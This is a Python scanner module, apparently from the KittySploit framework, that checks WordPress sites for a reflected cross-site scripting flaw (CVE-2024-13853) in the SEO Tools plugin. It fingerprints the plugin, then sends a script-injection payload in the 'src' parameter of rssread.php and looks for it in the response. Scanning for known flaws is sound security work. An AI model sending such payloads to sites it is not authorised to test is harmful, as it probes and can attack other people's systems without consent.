#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The SEO Tools WordPress plugin through version 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress SEO Tools Plugin 4.0.7 - Cross-Site Scripting Detection',
        'description': "The SEO Tools WordPress plugin through version 4.0.7 contains a reflected cross-site scripting vulnerability. The plugin does not properly sanitize and escape the 'src' parameter in the rssread.php file before outputting it back in the page, which could allow attackers to execute arbitrary JavaScript code in a victim's browser.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'wp', 'wordpress', 'wp-plugin', 'xss', 'seo-automatic-seo-tools', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/52991dd9-41f7-4cf8-b8c9-56dd4e62bf0c',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-13853',
        ],
        'cve': 'CVE-2024-13853',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=True)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('seo-automatic-seo-tools',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/wp-content/plugins/seo-automatic-seo-tools/feedcommander/rssread.php?src=1%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cscript%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"></script><script>alert(document.domain)</script><script>',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress SEO Tools Plugin 4.0.7 - Cross-Site Scripting detected', path=path)
            return True
        return False

